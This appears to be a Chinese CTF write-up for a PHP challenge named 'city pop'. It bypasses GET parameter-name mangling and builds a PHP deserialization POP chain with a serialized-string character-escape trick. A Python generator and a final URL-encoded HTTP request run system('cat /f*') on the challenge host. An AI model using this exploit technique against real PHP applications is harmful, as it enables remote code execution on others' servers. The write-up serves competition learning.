- # city pop
	- 思路：绕过GET参数会转换`.`的限制，传入序列化对象，并利用字符逃逸实例化任意对象，实现POP
	- 绕过GET参数
		- fuzz发现`ciscn[huaibei.pop`的`.`会保留，而方括号会变成下划线
	- POP
		- ```php
		  // Go::__destruct --> Get::__toString --> Get::__get --> Done::__invoke
		  
		  $done = new Done();
		  $done -> eval = "echo 114514;";
		  $get = new Get();
		  $get -> func = $done;
		  $get2 = new Get();
		  $get2 -> name = $get;
		  $go = new Go();
		  $go -> ray = $get2;
		  // $start = new Start("114514",serialize($go));
		  echo urlencode(serialize($go));
		  
		  ```
	- PHP序列化字符逃逸
		- 利用以下脚本构造对象
			- ```python
			  from utils.enc_dec import urlencode
			  
			  def human_readable(s):
			      s = s.replace(";", ";\n").replace("{", "{\n")
			      p = 0
			      while p < len(s):
			          s1 = s[p:]
			          if "s:" in s1:
			              num_start = s1.index("s:") + 2
			              num = s1[num_start:].split(":")[0]
			              # print(num)
			              num = int(num)
			              rm_start = p + num_start + len(str(num)) + 2
			              s = s[:rm_start] + s[rm_start:rm_start + num].replace("\n", "M") + s[rm_start + num:]
			              p = rm_start + num
			          else:
			              break
			  
			      s = s.replace("M", "")
			      l = s.split("\n")
			      indent = 0
			      for i in range(len(l)):
			          if "}" in l[i] and "s:" not in l[i]:
			              indent -= 1
			          l[i] = "    "*indent + l[i]
			          if "{" in l[i] and "s:" not in l[i]:
			              indent += 1
			      return "\n".join(l)
			  
			  eval_str = "var_dump(system('cat /f*'));"
			  
			  
			  start = "getflag" * 10
			  end = """           ";s:3:"end";
			  O:2:"Go":1:{s:3:"ray";O:3:"Get":2:{s:4:"func";N;s:4:"name";O:3:"Get":2:{s:4:"func";O:4:"Done":4:{s:4:"eval";s:LEN_EVAL:"EVAL";s:5:"class";N;s:3:"use";N;s:7:"useless";N;}s:4:"name";N;}}}
			  ;
			  """.replace("\n", "").replace("LEN_EVAL", str(len(eval_str))).replace("EVAL", eval_str)
			  s =  '''
			  O:5:"Start":2:{s:5:"start";s:LEN_START:"START";s:3:"end";s:LEN_END:"END";}
			  '''.replace("LEN_START", str(len(start))).replace("START", start).replace("LEN_END", str(len(end))).replace("END", end)
			  print(start)
			  print(urlencode(end))
			  print(human_readable(s))
			  
			  s = s.replace("getflag", "hark")
			  
			  print(human_readable(s))
			  # 执行watch python helper.py即可自动每秒运行一次脚本，实时预览脚本运行结果
			  ```
	- 最终payload如下
		- ```http
		  GET /pop.php?ciscn[huaibei.pop=getflaggetflaggetflaggetflaggetflaggetflaggetflaggetflaggetflaggetflag&pop=%20%20%20%20%20%20%20%20%20%20%20%22%3Bs%3A3%3A%22end%22%3BO%3A2%3A%22Go%22%3A1%3A%7Bs%3A3%3A%22ray%22%3BO%3A3%3A%22Get%22%3A2%3A%7Bs%3A4%3A%22func%22%3BN%3Bs%3A4%3A%22name%22%3BO%3A3%3A%22Get%22%3A2%3A%7Bs%3A4%3A%22func%22%3BO%3A4%3A%22Done%22%3A4%3A%7Bs%3A4%3A%22eval%22%3Bs%3A28%3A%22var_dump%28system%28%27cat%20/f%2A%27%29%29%3B%22%3Bs%3A5%3A%22class%22%3BN%3Bs%3A3%3A%22use%22%3BN%3Bs%3A7%3A%22useless%22%3BN%3B%7Ds%3A4%3A%22name%22%3BN%3B%7D%7D%7D%3B HTTP/1.1
		  Host: 172.1.35.1
		  Upgrade-Insecure-Requests: 1
		  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
		  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
		  Accept-Encoding: gzip, deflate
		  Accept-Language: zh-CN,zh;q=0.9
		  Connection: close
		  
		  
		  ```